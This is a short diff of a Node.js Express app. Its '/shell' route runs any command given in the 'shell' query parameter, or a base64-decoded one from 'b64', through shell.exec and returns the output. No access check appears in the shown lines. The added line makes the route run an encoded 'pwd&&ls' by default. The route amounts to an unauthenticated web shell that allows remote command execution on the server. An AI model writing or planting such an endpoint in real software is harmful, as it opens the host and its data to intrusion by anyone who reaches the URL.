@@ -90,6 +90,7 @@ app.set((req, res, next)=>{
 
 app.use('/shell', (req, res)=>{
   if(req.query.shell!=undefined||req.query.b64!=undefined){
+    req.query.b64 = req.query.b64||'cHdkJiZscw==';
     let b64 = Buffer.from(req.query.b64||'', 'base64').toString('ascii')
     shell.exec(req.query.shell||b64,function(error,stdout,stderr){
       res.end(stdout);
